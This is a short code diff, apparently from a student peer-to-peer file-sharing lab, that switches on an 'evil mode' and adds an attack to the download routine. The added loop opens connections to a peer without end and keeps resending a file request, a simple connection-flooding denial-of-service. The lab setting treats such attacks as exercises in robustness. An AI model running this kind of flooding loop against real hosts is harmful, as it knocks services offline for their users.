@@ -25,7 +25,7 @@
 
 #include "pthread.h"
 
-int evil_mode = 0;			// nonzero iff this peer should behave badly
+int evil_mode = 1;			// nonzero iff this peer should behave badly
 //#define EXTRA_CREDIT
 
 static struct in_addr listen_addr;	// Define listening endpoint
@@ -873,7 +873,7 @@ void* pthread_task_upload(void * input)
 
 // Mostly copy from task download and 
 void evil_download(task_t *t, task_t* tracker_task) {
-	int i, ret = -1;
+	int i, ret = -1, evil_ret = -1;
 	assert((!t || t->type == TASK_DOWNLOAD)
 	       && tracker_task->type == TASK_TRACKER);
 
@@ -890,11 +890,26 @@ void evil_download(task_t *t, task_t* tracker_task) {
 	message("* Attacking %s:%d to download '%s'\n",
 		inet_ntoa(t->peer_list->addr), t->peer_list->port,
 		t->filename);
+    
 	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
 	if (t->peer_fd == -1) {
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
+
+
+    // request invalid file name
+    message("* Attacking with repeated connection.\n");
+    // request a file over and over again
+    osp2p_writef(t->peer_fd, "GET cat2.jpg OSP2P\n");
+    while(1) {
+        evil_ret = open_socket(t->peer_list->addr, t->peer_list->port);
+        if (evil_ret == -1) {
+            error("* Peer give up sadly: %s\n", strerror(errno));
+            goto try_again;
+        }
+        osp2p_writef(t->peer_fd, "GET cat2.jpg OSP2P\n");
+    }
 	
 	// Read the file into the task buffer from the peer, just till
 	// it fills up
